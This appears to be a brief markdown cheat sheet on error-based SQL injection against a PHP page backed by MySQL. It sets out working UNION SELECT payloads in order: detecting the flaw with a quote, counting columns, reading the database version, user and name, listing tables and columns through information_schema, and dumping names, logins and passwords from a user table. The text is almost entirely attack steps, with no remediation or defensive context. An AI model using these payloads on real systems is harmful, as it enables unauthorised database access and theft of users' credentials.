# SQLI | Error Based

Context URL: `http://example.com/example/page.php?id=agency`

To test if exists SQLI Error Based, try the:

```
http://example.com/example/page.php?id='
```

If **warnings** return to you, exploit them!

Example:

```
....php?id=agency' union select 1,2 %23
```

Note: \
1,2,3,4... you have to enter a sequence of numbers until the error stops.\
%23 = # -> to comment rest of the line

**Context example database:**\
**\*** MySQL database\
****\* 6 columns\
\* 5 numbers in the sequence (after payload)

Get database information:

```
....php?id=agency' union select 1,2,version(),user(),database() %23
```

The application returns to me in sequence:\
\> Database version, Database user, Database name

**Context results:**\
\* Database name: vehicles\


Get tables information

```
union select 1,2,table_name,4,5 from information_schema.tables where table_schema="vehicles" %23
```

**Context results:**\
\* Table names: adm, agency, mrusers

Get column information:

```
union select 1,2,column_name,4,5 from information_schema.columns where table_schema="vehicles" and table_name="mrusers" %23
```

**Context results:**\
\* Columns: name, login, password

Get final information:

```
...php?id=agency' union select 1,2,name,login,password from mrusers %23
```

